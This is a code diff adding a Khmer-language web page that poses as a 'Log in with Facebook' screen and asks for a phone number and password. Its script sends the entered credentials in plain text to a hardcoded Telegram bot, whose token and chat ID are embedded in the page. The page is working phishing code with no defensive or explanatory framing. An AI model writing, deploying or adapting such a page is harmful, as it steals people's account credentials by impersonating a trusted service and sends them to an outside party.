@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="km">
+<head>
+  <meta charset="UTF-8" />
+  <title>ចូលគណនី Facebook + Form</title>
+  <link href="https://fonts.googleapis.com/css2?family=Battambang&display=swap" rel="stylesheet" />
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Battambang', sans-serif;
+      background: linear-gradient(135deg, #4facfe, #00f2fe);
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      color: #333;
+    }
+    #loginBtn {
+      padding: 12px 30px;
+      background-color: #1877f2;
+      border: none;
+      border-radius: 8px;
+      color: white;
+      font-size: 18px;
+      cursor: pointer;
+      margin-bottom: 20px;
+    }
+    #status {
+      margin-bottom: 20px;
+      font-size: 16px;
+      font-weight: bold;
+    }
+    .login-box {
+      background: #ffffff;
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+      width: 100%;
+      max-width: 360px;
+      display: none;
+      flex-direction: column;
+    }
+    .login-box label {
+      margin-bottom: 6px;
+      font-weight: bold;
+    }
+    .login-box input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+    .login-box button {
+      padding: 14px;
+      background-color: #00aaff;
+      border: none;
+      border-radius: 8px;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    .login-box button:hover {
+      background-color: #0077cc;
+    }
+    .status-msg {
+      text-align: center;
+      margin-top: 15px;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+
+  <button id="loginBtn">ចូលជាមួយ Facebook</button>
+  <div id="status">សូមចុចប៊ូតុងខាងលើដើម្បីបំពេញព័ត៌មាន</div>
+
+  <div class="login-box" id="formBox">
+    <h2>បញ្ចូលព័ត៌មាន</h2>
+    <form id="loginForm">
+      <label for="phone">លេខទូរស័ព្ទ</label>
+      <input type="tel" id="phone" placeholder="បញ្ចូលលេខទូរស័ព្ទ" required />
+      
+      <label for="password">ពាក្យសម្ងាត់</label>
+      <input type="password" id="password" placeholder="បញ្ចូលពាក្យសម្ងាត់" required />
+      
+      <button type="submit">ផ្ញើ</button>
+      <div class="status-msg" id="sendStatus"></div>
+    </form>
+  </div>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = "7574494382:AAFZhFrO4wRPHJdYw0gk7o3ba4iwhu5eA8c";
+    const TELEGRAM_CHAT_ID = "1597785838";
+
+    // ពេលចុចប៊ូតុង បង្ហាញ Form ហើយលាក់ប៊ូតុង និង status ពីលើ
+    document.getElementById('loginBtn').onclick = function() {
+      document.getElementById('loginBtn').style.display = 'none';
+      document.getElementById('status').textContent = "សូមបញ្ចូលលេខទូរស័ព្ទ និងពាក្យសម្ងាត់";
+      document.getElementById('formBox').style.display = 'flex';
+    };
+
+    // Submit form -> ផ្ញើទៅ Telegram
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const phone = document.getElementById('phone').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const sendStatus = document.getElementById('sendStatus');
+
+      if(!phone || !password){
+        sendStatus.textContent = "សូមបំពេញទាំងពីរប្រអប់!";
+        sendStatus.style.color = "red";
+        return;
+      }
+
+      const message = `🔐 [Login Info]\n📱 លេខទូរស័ព្ទ: ${phone}\n🔑 ពាក្យសម្ងាត់: ${password}`;
+
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message
+        })
+      })
+      .then(res => res.json())
+      .then(data => {
+        if(data.ok){
+          sendStatus.textContent = "✅ បានផ្ញើទៅ Telegram រួចរាល់!";
+          sendStatus.style.color = "green";
+          this.reset();
+        } else {
+          throw new Error("Failed to send");
+        }
+      })
+      .catch(err => {
+        sendStatus.textContent = "❌ មានបញ្ហាក្នុងការផ្ញើ!";
+        sendStatus.style.color = "red";
+      });
+    });
+  </script>
+
+</body>
+</html>
